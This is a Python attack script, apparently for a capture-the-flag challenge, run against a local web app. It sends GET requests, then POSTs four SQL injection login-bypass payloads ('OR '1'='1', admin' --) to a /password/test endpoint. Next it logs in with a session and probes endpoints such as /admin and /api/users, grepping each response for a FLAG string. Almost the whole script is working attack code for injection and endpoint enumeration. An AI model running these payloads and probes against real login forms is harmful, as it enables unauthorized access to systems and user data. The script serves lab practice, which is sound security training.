import requests
import re

BASE_URL = "http://127.0.0.1:32883"

print("[*] Exploring authentication mechanisms and endpoints\n")

# Test 1: Try accessing /password/test with GET to see what it returns
print("[TEST 1] GET /password/test")
resp1 = requests.get(f"{BASE_URL}/password/test")
print(f"Status: {resp1.status_code}")
print(f"Response length: {len(resp1.text)}B")
print(f"Response:\n{resp1.text}\n")

# Check for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', resp1.text)
if flag_match:
    print(f"[!] FLAG FOUND: {flag_match.group(0)}\n")

print("="*60 + "\n")

# Test 2: Check if there's a /password endpoint (parent)
print("[TEST 2] GET /password")
resp2 = requests.get(f"{BASE_URL}/password")
print(f"Status: {resp2.status_code}")
print(f"Response length: {len(resp2.text)}B")
print(f"Response:\n{resp2.text}\n")

flag_match = re.search(r'FLAG\{[^}]+\}', resp2.text)
if flag_match:
    print(f"[!] FLAG FOUND: {flag_match.group(0)}\n")

print("="*60 + "\n")

# Test 3: Try POST to /password/test with different payloads
print("[TEST 3] POST /password/test with SQL injection payloads")

sqli_payloads = [
    {"username": "test' OR '1'='1", "password": "test"},
    {"username": "test", "password": "test' OR '1'='1"},
    {"username": "admin' --", "password": "anything"},
    {"username": "test", "password": "test", "user_id": "1' OR '1'='1"},
]

for i, payload in enumerate(sqli_payloads, 1):
    print(f"\n  Payload {i}: {payload}")
    resp = requests.post(f"{BASE_URL}/password/test", data=payload, allow_redirects=False)
    print(f"  Status: {resp.status_code}")
    print(f"  Location: {resp.headers.get('Location', 'N/A')}")
    
    if resp.status_code != 302 or 'error' not in resp.headers.get('Location', ''):
        print(f"  [+] Different response! Response:\n{resp.text}")

print("\n" + "="*60 + "\n")

# Test 4: Try using session from auth and making direct requests
print("[TEST 4] Create session, then try multiple endpoints")

session = requests.Session()
auth_data = {'username': 'test', 'password': 'test'}
auth_resp = session.post(f"{BASE_URL}/password/test", data=auth_data, allow_redirects=False)
print(f"Auth status: {auth_resp.status_code}")
print(f"Cookies: {dict(session.cookies)}")

# Try various endpoints
endpoints_to_test = [
    "/dashboard",
    "/profile", 
    "/api/user",
    "/api/users",
    "/user",
    "/users",
    "/admin",
    "/password",
    "/password/test",
    "/logout"
]

for endpoint in endpoints_to_test:
    try:
        resp = session.get(f"{BASE_URL}{endpoint}", timeout=3)
        if resp.status_code != 404:
            print(f"\n  {endpoint}: Status {resp.status_code}, Length {len(resp.text)}B")
            
            # Check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"    [!] FLAG FOUND: {flag_match.group(0)}")
                print(f"    Full response:\n{resp.text}")
            elif resp.status_code == 200 and len(resp.text) < 2000:
                print(f"    Snippet: {resp.text[:300]}")
    except:
        pass

